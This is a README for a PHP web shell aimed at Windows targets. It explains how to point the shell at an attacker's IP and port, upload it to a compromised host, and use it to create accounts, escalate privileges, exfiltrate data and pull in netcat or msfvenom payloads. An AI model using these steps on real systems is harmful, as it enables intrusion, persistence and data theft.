<h1> The Not-So Simple PHP Command Shell</h1>
<img src="/img/nsscmdshell.png" />
<p>Automates many on target functions. Designed for windows targets. It isn't pretty, but it works as intended. Note that the tools in my quick upload function are not included in this repo as they are the work of other parties. </p>
<img src="https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshelluse.gif" />
<h2>Automates or simplifies many on target enumeration functions. Specifically:</h2>
<ul>
<li>Simple system commands</li>
<li>File upload/download options</li>
<li>One click preset user creation (on compatible targets)</li>
<li>One click Priv Esc for preset user (on compatible targets)</li>
<li>One click user info/ user perm info</li>
<li>One click systeminfo</li>
<li>One Click processes list</li>
<li>And many more...</li>
</ul>

<h2>How to use it</h2>
<p>First, change the variables, "$attackip" and "$attackport" to the appropriate values for YOUR attack machine:</p>
<code>$attackip = "10.0.2.6";</code><br>
<code>$attackport = "8000";</code>

<p>Next, upload the nsscmdshell.php file to the target. Please note that gaining access to the target is beyond the scope of this writing and your responsibility to establish in a manner consistent with established law.  This tool is intended to be used for on target enumeration to gather and exfiltrate information and then to upload tools such as netcat or msvenom payload for further access to the target.  Once you've gained sufficient access to a target to upload the nsscmdshell, no further instruction on using this tool should be needed.  Do not open issues because you don't know how to use this tool.  It works.  Got "Warning: file_get_contents(http://XX.XX.XX.XX:xxxx/filename.ext):failed to open stream: No connetion could be made...." error?  Two possible causes: 1).You didn't set the variables, "$attackip" and "$attackport" to your machine. Fix: ifconfig your ip, and set in nsscmdshell.php lines 10 and 11. 2). The files are not available on the defined server or port, or there is no server running on the defined port. Fix: python3 -m http.server 8000 in a directory containing the files you're attempting to upload.</p>

